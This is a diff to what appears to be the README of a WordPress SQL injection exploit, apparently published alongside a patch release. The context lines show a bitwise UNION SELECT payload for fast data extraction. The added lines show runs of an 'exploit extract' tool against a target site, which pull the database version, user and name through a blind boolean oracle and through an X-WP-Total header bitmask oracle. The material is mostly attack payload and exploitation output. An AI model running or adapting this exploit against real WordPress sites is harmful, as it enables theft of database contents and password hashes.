@@ -185,6 +185,22 @@ UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 2) > 0   -- bit 1
 
 16 chars x 7 bits = 112 probes per request. A 34-char phpass hash in ~3 requests instead of ~224.
 
+```
+$ python3 -m exploit extract http://target --mode blind --preset fingerprint
+[*] using blind boolean oracle (binary search, 1 bit per request)
+[+] MySQL version: 8.0.46
+[+] Database user: wordpress@%
+[+] Database name: wordpress
+[*] 198 requests sent
+
+$ python3 -m exploit extract http://target --preset fingerprint
+[*] using X-WP-Total bitmask oracle (16 chars/request)
+[+] MySQL version: 8.0.46
+[+] Database user: wordpress@%
+[+] Database name: wordpress
+[*] 3 requests sent
+```
+
 ## References
 
 - [WordPress 7.0.2 release](https://wordpress.org/news/2026/07/wordpress-7-0-2-release/)
